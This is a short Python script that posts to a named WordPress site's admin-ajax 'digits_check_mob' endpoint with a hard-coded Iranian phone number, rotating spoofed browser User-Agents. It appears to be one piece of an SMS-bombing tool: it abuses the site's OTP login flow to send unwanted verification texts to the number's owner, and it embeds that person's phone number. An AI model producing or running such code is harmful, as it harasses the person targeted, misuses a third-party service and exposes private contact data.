import requests
import random
number = "9373058966"
heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
     {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/112.0',
    'accept': '*/*'
    },
    {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'accept': '*/*'
    }
]
random_head = random.choice(heads)






url_ = "https://barsamgd.com/wp-admin/admin-ajax.php"
json_ = {
	"action": "digits_check_mob",
	"countrycode": "+98",
	"mobileNo": number,
	"csrf": "f8bb2ac5a5",
	"login": "1",
	"username": "",
	"email": "",
	"captcha": "",
	"captcha_ses": "",
	"digits": "1",
	"json": "1",
	"whatsapp": "0",
	"mobmail": "937+305+8966",
	"dig_otp": "",
	"dig_nounce": "f8bb2ac5a5"
}


req_ = requests.post(url=url_,json=json_,headers=random_head)
print("",req_)